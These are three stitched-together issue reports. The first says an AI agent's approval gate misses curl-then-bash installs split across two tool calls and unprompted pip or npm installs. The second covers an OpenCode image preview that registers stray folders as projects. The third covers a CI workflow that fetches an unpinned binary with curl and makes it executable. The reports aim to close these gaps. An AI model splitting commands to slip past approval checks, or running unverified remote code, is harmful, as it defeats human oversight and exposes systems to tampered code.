DANGEROUS_PATTERNS in tools/approval_detection.py already gates a direct curl | bash installer, but misses two adjacent cases that carry the same risk: (1) the same install split across two separate tool calls — download to a file, then execute it in the next call — and (2) any package-manager install (pip install, npm install -g, pipx install, uv tool install), which pulls arbitrary code from a registry the same way a curl|bash installer does.

### Steps to Reproduce

Ask the agent to install a tool that isn't a known Hermes skill (e.g. "install Agent-Reach").
The agent runs pip install agent-reach and/or npm install -g mcporter directly via the terminal tool — no approval prompt.
Separately, ask the agent to install a skill whose own SKILL.md documents a curl -fsSL <url> | bash installer (e.g. the official parallel-cli skill).
The agent splits it into curl -fsSL <url> -o script.sh (call N) then bash script.sh (call N+1) — neither call is flagged, even though the combined effect is identical to the piped form the existing pattern already catches.

### Expected Behavior

Both cases should require approval, same as the existing curl|sh pattern.

### Actual Behavior

Neither requires approval; the commands run immediately.

### Affected Component

Tools (terminal, file ops, web, code execution, etc.)

### Messaging Platform (if gateway-related)

_No response_

```shell
N/A — code-logic bug in DANGEROUS_PATTERNS regex coverage, reproducible on any clean install regardless of local config/logs.

Debian 12

_No response_

_No response_

```shell

tools/approval_detection.py, DANGEROUS_PATTERNS list (~line 283). items.title: app: showing a local image registers its folder as a project
items.body:
### Description

When the web app shows a local image given by absolute path (a `read` preview, or an image in markdown, which uses the same loader), it fetches it with the image's parent folder as the location (`readLocalImage` in `packages/app/src/runtime/server/image.ts`: "Scope absolute images to their parent, including files outside the project"). Naming a location makes the server resolve and persist it. So if that folder isn't inside a known project, it becomes a new project at the top of the project list, and its location services boot: config, plugins, file watchers, and a connection to every configured MCP server, all for that folder.

Opening one preview of a render outside any repository (`/mnt/d/Projects/vrchat/tripo/bounty/eval/views.png`) did exactly that: a new project for `…/bounty/eval/`, and the log shows `location services booted` for it followed by three `mcp connected` lines. Two other image folders had become projects earlier the same day, booted with the same trailing-slash location `readLocalImage` produces. The projects stay: there is no API to archive or delete one, and the hourly sweep only archives projects whose directory is gone.

Possible fixes: resolve the preview's location without persisting it (`Project.resolve` takes `persist: false` since 2.1.4), or read images inside the session's directory with the session's location, as relative paths already are.

### Plugins

None relevant

### OpenCode version

2.1.4 (`image.ts` unchanged on `dev` as of 20a6cc7)

### Steps to reproduce

1. Have the agent `read` a PNG by absolute path in a folder that isn't inside any project.
2. In the web app, expand that read row to show the preview.
3. `GET /api/project`: the folder is now a project, and the server log shows its location services booting and each MCP server connecting for it.

Linux (opencode service on WSL2 Ubuntu 24.04); web app on Chrome

items.title: static-analysis-gate.yml installs an executable from an unpinned releases/latest URL with no checksum

labels.name: status:ready
labels.description: Fully specified and ready to be picked up

items.body:
## The finding

`.github/workflows/static-analysis-gate.yml` downloads an executable from a
**floating `releases/latest` URL** and puts it on `PATH` as root, at two sites
(`:35` and `:265`):

```bash
PA_URL="https://github.com/hyperpolymath/panic-attack/releases/latest/download/panic-attack-linux-x86_64"
if curl -fsSL --head "$PA_URL" >/dev/null 2>&1; then
  curl -fsSL -o /usr/local/bin/panic-attack "$PA_URL"
  chmod +x /usr/local/bin/panic-attack
```

There is no version pin, no checksum, and no signature check. Whatever bytes sit
behind `latest` at the moment the job runs are executed with the workspace
checked out.

## Why the usual mitigations do not apply here

- **`actions.lock` does not cover it.** The lock pins `uses:` references. This is
  a `run:` step, so it is outside the lockfile's model by construction — the same
  blind spot that hid the unpinned `git-cliff` fetch in `release.yml`.
- **The publishing repo being first-party is not a pin.** `hyperpolymath/panic-attack`
  is estate-owned, but `latest` still means "whatever was published most recently",
  including a mistaken or reverted release. Provenance is not immutability.
- **The gate's verdict can change with no commit to this repository** — the same
  property that was explicitly called out and fixed for the Hypatia clone twelve
  lines below, where the comment now reads *"PINNED. An unpinned clone of hypatia's
  default branch let this gate's verdict change with no commit to paint-type."*

## Acceptance criteria

1. Both sites (`:35`, `:265`) fetch a **specific released version**, not `latest`.
   The version appears literally in the workflow.
2. The downloaded bytes are verified against a **checksum pinned in the workflow**
   before `chmod +x`. Assert by corrupting the expected checksum and confirming
   the job goes red — a checksum that is never compared is decoration.
3. The two sites reference the **same** version through a single definition. Two
   independently-edited pins drift, and the drift is silent.
4. Failure to verify is **fail-closed**: no execution, job red. It must not fall
   through to the `installed=false` path, which is green today (see the companion
   issue on vacuous passes).
5. A documented procedure exists for bumping the pin, so the pin does not
   calcify into a permanently stale binary. A pin nobody can bump becomes a pin
   somebody removes.
